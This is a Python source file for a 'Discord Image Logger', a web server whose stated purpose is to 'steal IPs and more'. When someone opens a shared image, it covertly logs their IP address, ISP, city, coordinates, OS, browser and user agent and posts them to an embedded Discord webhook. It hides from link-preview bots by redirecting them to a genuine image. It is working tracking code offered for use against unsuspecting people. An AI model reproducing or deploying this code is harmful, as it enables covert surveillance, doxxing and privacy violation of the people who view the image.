# Discord Image Logger - Server-Side Image Serving
# By Dexty | https://github.com/xdexty0

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser
import io

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "Dexty"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1437431909297950831/hOR6sC5C0jZqrc19t0udy6CD02ujqAOVlyNAg07omPr8m9jTDKg_OHmPkxsIDU1XI-bS",
    "image": "https://images-ext-1.discordapp.net/external/k-1uR6-3cGW00FGnucvcAPj5DNCblMndZH6ubGISnQo/https/tinyjpg.com/images/social/website.jpg",
    "imageArgument": True,

    # CUSTOMIZATION #
    "username": "Image Logger",
    "color": 0x00FFFF,

    # OPTIONS #
    "crashBrowser": False,
    "accurateLocation": False,
    "message": {
        "doMessage": False,
        "message": "This browser has been pwned by Dexty's Image Logger. https://github.com/xdexty0/Discord-Image-Logger",
        "richMessage": True,
    },
    "vpnCheck": 1,
    "linkAlerts": True,
    "buggedImage": False,
    "antiBot": 1,

    # REDIRECTION #
    "redirect": {
        "redirect": False,
        "page": "https://your-link.here"
    },
}

blacklistedIPs = ("27", "104", "143", "164")

def botCheck(ip, useragent):
    if not useragent:
        return False
        
    useragent_lower = useragent.lower()
    
    if "discordbot" in useragent_lower:
        return "Discord"
    elif "telegrambot" in useragent_lower:
        return "Telegram"
    elif any(bot in useragent_lower for bot in ['bot', 'crawler', 'spider', 'scraper']):
        return "Other Bot"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False, is_bot = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot and not is_bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None
        return

    ping = "@everyone"

    try:
        info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
        if info["proxy"]:
            if config["vpnCheck"] == 2:
                    return
            
            if config["vpnCheck"] == 1:
                ping = ""
        
        if info["hosting"]:
            if config["antiBot"] == 4:
                if info["proxy"]:
                    pass
                else:
                    return

            if config["antiBot"] == 3:
                    return

            if config["antiBot"] == 2:
                if info["proxy"]:
                    pass
                else:
                    ping = ""

            if config["antiBot"] == 1:
                    ping = ""

        os, browser = httpagentparser.simple_detect(useragent) if useragent else ("Unknown", "Unknown")
    except:
        info = {}
        os, browser = "Unknown", "Unknown"
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info.get('isp', 'Unknown')}`
> **ASN:** `{info.get('as', 'Unknown')}`
> **Country:** `{info.get('country', 'Unknown')}`
> **Region:** `{info.get('regionName', 'Unknown')}`
> **City:** `{info.get('city', 'Unknown')}`
> **Coords:** `{str(info.get('lat', ''))+', '+str(info.get('lon', '')) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info.get('timezone', 'Unknown').split('/')[1].replace('_', ' ') if '/' in info.get('timezone', '') else info.get('timezone', 'Unknown')}`
> **Mobile:** `{info.get('mobile', 'Unknown')}`
> **VPN:** `{info.get('proxy', 'Unknown')}`
> **Bot:** `{info.get('hosting', 'Unknown') if info.get('hosting') and not info.get('proxy') else 'Possibly' if info.get('hosting') else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:** `{useragent}`
""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            client_ip = self.headers.get('x-forwarded-for') or self.client_address[0]
            user_agent = self.headers.get('user-agent', '')
            
            bot = botCheck(client_ip, user_agent)
            
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    image_url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    image_url = config["image"]
            else:
                image_url = config["image"]
            
            if client_ip.startswith(blacklistedIPs):
                return
            
            if bot:
                # For bots, redirect to actual image
                self.send_response(302)
                self.send_header('Location', image_url)
                self.end_headers()
                makeReport(client_ip, endpoint = s.split("?")[0], url = image_url, is_bot=True)
                return
            
            else:
                # SERVER-SIDE IMAGE SERVING
                # Download the image and serve it directly
                try:
                    # Fetch the image from the URL
                    response = requests.get(image_url, stream=True)
                    response.raise_for_status()
                    
                    # Get image content and content type
                    image_data = response.content
                    content_type = response.headers.get('content-type', 'image/jpeg')
                    
                    # Log the user's IP and info
                    s = self.path
                    dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                    if dic.get("g") and config["accurateLocation"]:
                        location = base64.b64decode(dic.get("g").encode()).decode()
                        result = makeReport(client_ip, user_agent, location, s.split("?")[0], url = image_url)
                    else:
                        result = makeReport(client_ip, user_agent, endpoint = s.split("?")[0], url = image_url)
                    
                    # Serve the actual image directly
                    self.send_response(200)
                    self.send_header('Content-type', content_type)
                    self.send_header('Content-Length', str(len(image_data)))
                    self.end_headers()
                    self.wfile.write(image_data)
                    
                except Exception as e:
                    # If image download fails, fall back to HTML method
                    html_fallback = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{image_url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''
                    
                    self.send_response(200)
                    self.send_header('Content-type', 'text/html')
                    self.end_headers()
                    self.wfile.write(html_fallback.encode())
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(b'500 - Internal Server Error')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = app = ImageLoggerAPI
